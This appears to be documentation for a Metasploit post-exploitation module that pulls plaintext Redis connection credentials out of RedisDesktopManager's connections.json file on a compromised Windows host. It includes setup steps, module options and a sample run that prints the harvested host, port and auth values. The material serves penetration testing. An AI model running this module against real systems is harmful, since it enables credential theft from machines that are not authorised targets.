### Overview

[RedisDesktopManager](https://github.com/uglide/RedisDesktopManager) RedisDesktopManager's credentials are saved in a JSON file in plaintext.


### Setup Steps

1. Download the latest installer of Redisdesktopmanager from https://github.com/uglide/RedisDesktopManager/releases.
   But this needs to be subscribed before it can be downloaded. You can download the window version from another project.
   https://github.com/lework/RedisDesktopManager-Windows/releases
2. Follow the installer's prompts to install the software. Select all the default settings.
3. Once everything has been installed, start RedisDesktopManager. click "Connect To Redis Server",
   Click OK after filling in the connection information.

## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/rdm
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifcats/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by defalt and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
### Default Output
  ```
msf6 post(windows/gather/credentials/rdm) > run 
[*] Filtering based on these selections:
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true 
[*] Redis_desktop_manager's Connections.json file found
[*] Downloading C:\Users\FireEye\.rdm\connections.json 
[*] Redis_desktop_manager Connections.json downloaded
[+] File saved to:  /home/kali-team/.msf4/loot/20220912203358_default_192.168.80.128_redis_desktop_ma_731068.json
[+] ['name']:  T
[+] ['username']:  A
[+] ['auth']:  my_redis
[+] ['host']:  10.168.1.201
[+] ['port']:  6379
[+] File with data saved:  /home/kali-team/.msf4/loot/20220912203404_default_192.168.80.128_EXTRACTIONSconne_982832.json

  ```
 